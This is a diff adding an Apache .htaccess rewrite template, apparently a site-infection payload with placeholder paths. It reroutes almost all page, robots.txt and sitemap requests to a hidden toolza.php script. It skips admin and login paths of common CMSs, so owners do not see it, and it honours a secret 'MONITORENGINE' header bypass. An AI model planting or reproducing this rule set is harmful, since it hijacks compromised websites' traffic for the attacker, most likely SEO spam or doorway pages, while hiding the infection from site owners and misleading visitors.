@@ -1,0 +1,14 @@
+#MonitorEngineS_1010011010
+
+RewriteEngine On
+#cgi
+RewriteCond %{REQUEST_URI} .*/#{{pathToToolza}}#/toolza.php$
+RewriteRule .* - [L]
+
+RewriteCond %{HTTP:MONITORENGINE} !^turns$
+RewriteCond %{REQUEST_URI} ^[^\.]*$ [OR]
+RewriteCond %{REQUEST_URI} ^.*((\.(php|html|htm|php4|php5))|robots.txt|sitemap.xml|sitemap_[0-9]{1,2}.xml).*$
+RewriteCond %{REQUEST_URI} !(^.*((/(bitrix|administrator|yandex_market|admin|wp-admin|wp-login|manager|simpla|netcat|login|1c_exchange.php|django.wsgi|phpshop|admpanel))).*)
+RewriteRule ^.*$ /#{{pathToToolza}}#/toolza.php [L]
+#MonitorEngineE_1010011010
+#{{lastHtaccess}}#
